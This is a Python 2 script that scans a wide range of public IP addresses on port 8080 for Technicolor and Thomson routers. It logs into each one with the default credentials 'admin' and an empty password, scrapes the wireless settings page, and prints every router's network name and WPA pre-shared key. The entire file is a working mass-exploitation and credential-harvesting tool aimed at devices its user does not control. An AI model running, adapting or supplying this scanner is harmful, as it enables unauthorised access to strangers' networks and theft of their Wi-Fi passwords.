# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
tech=0
tom=0
for i in range(180,201):
    i=i+1
    c=str(i)
    for j in range(53,82):
        j=j+1
        l=str(j)
        for p in range(152,255):
            p=p+1
            m=str(p)
            for a in range(0,255):
                a=a+1
                g=str(a)
                
                h=c+"."+l+"."+m+"."+g
                
                try:
                    r1=requests.get('http://'+str(h)+':8080/', timeout=0.3)
                    head=r1.headers
                    b='WWW-Authenticate' in head
                    
                    if b==True:
                        r=requests.get('http://'+h+':8080/', timeout=0.3)
                        n=r.headers['WWW-Authenticate']=='Basic realm="Technicolor"'
                        if n==True: ##Technicolor
                            tech=tech+1
                            r2=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', ''), timeout=0.4)
                            parser1=r2.content
                            bs1=BeautifulSoup(parser1, "html.parser")
                            for td in bs1.find_all("td", align="middle"):
                                for pwd in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                    #print pwd["value"]
                                    print str(h)+".....Technicolor......."+td.text[16:]+"....."+pwd["value"]
                        else: ##Thomson
                            tom=tom+1
                            
                            r3=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', ''), timeout=0.4)
                            r4=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', ''), timeout=0.4)

                            
                            parser=r4.content
                            bs1=BeautifulSoup(parser, "html.parser")
                            
                            for t in bs1.find_all("td", align='middle'):
                                for pws in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                    print h+".....Thomson..........."+t.text[16:]+"....."+pws["value"]
            
                except requests.exceptions.ConnectTimeout:
                    pass
                except requests.exceptions.ReadTimeout:
                    pass
                except requests.exceptions.ConnectionError:
                    pass
                except KeyError:
                    pass
print str(tech)+" technicolor"
print str(tom)+" tomson"
print str(tech+tom)+" En total"

                            

